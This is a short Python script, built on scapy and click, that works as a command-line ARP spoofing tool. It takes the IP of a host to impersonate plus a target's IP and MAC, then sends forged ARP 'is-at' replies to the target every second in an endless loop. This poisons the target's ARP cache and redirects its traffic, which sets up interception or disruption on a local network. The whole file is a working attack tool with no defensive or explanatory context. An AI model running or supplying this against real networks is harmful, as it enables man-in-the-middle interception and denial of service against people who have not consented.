from scapy.all import *
import time
import click

@click.command()
@click.option('--endpoint-ip', help="The host's IP address you want to impersonate.")
@click.option('--target-ip', help="The host's IP address you want to target.")
@click.option('--target-mac', help="The host's MAC address you want to target.")
def main(endpoint_ip, target_ip, target_mac):
    while True:
        sendp(Ether(dst=target_mac)/ARP(op="is-at", psrc=endpoint_ip, pdst=target_ip))
        time.sleep(1)

if __name__ == '__main__':
    main()
